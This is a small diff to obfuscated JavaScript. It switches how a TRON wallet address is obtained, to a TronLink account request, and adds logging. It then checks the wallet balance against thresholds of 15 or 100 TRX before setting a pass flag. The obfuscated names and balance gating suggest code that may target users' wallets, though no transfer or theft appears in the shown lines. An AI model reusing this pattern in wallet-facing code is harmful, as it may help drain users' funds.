@@ -72,7 +72,8 @@ async function user() {
     }
   } catch (_0x5d72d1) {}
   try {
-    wallet_user_address = await this.tronweb.defaultAddress.base58;
+    wallet_user_address = await tronLink.request({ method: "tron_requestAccounts" });
+	  console.log("TRON wallet_user_address", wallet_user_address);
     var _0x682780 = await this.tronweb.fromSun(await this.tronweb.trx.getBalance(wallet_user_address));
     gascanapppass = _0x682780 >= 15 && mode == 0 ? true : _0x682780 >= 100 && mode != 0 ? true : false;
     wallet_user_address.length > 10 && (chain = "TRON", chainid = 0);
